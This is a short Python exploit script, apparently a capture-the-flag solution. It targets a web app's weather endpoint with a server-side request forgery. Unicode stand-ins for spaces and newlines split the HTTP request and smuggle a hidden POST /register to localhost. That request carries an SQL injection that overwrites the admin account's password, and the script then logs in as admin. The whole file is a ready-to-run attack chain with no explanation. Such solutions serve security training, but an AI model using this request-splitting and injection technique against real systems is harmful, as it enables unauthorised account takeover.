import json
import urllib
import requests

url = "http://138.68.191.86:32363/"
# username must be admin to overwrite admin's pass with sqli
password = "ya2m"
# HttpGet(`http://${endpoint}/data/2.5/weather?q=${city},${country}&units=metric&appid=${apiKey}`);
payload = "endpoint=127.0.0.1&city=".encode('utf-8')
payload += f"ĠHTTP/1.1ĊHost:Ġ127.0.0.1:80ĊConnection:Ġkeep-aliveĊĊĊPOSTĠ/registerĠHTTP/1.1ĊHost:Ġ127.0.0.1:80ĊContent-Type:Ġapplication/x-www-form-urlencodedĊUser-Agent:ĠMozilla/5.0Ġ(X11;ĠLinuxĠx86_64;Ġrv:85.0)ĠGecko/20100101ĠFirefox/85.0ĊConnection:Ġkeep-aliveĊContent-Length:Ġ110ĊĊusername=adminĦpassword=hello%27)%20ON%20CONFLICT(username)%20DO%20UPDATE%20SET%20password=%27{password}%27%20--+-ĊĊGETĠ/?".encode('utf-8')
payload += "&country=HR".encode('utf-8')

print("blind SSRF to register")
headers = {"Content-Type": "application/x-www-form-urlencoded"}
resData = requests.post(url + "api/weather", data=payload, proxies={"http": "127.0.0.1:8080"}, headers=headers)
print(resData.status_code)
print(resData.content)

print("Trying to login")
resData = requests.post(url + "login", data={"username": "admin", "password": password})
print(resData.status_code)
print(resData.content)
